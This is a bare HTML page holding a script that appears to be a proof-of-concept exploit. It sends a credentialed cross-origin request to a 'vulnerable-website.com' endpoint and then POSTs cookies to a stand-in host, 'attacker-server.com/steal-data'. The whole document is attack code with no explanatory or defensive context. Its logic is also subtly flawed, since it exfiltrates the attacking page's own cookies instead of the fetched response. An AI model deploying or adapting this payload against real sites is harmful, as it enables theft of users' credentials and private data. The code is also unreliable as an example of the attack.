<html>
<body>
   <script>
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://vulnerable-website.com/sensitive-endpoint', true);
      xhr.withCredentials = true;  // Ensures cookies are sent
      xhr.onreadystatechange = function() {
         if (xhr.readyState == 4 && xhr.status == 200) {
            // Send the data back to the attacker's server
            var cookies = document.cookie;
            fetch('http://attacker-server.com/steal-data', {
               method: 'POST',
               body: cookies
            });
         }
      };
      xhr.send();
   </script>
</body>
</html>
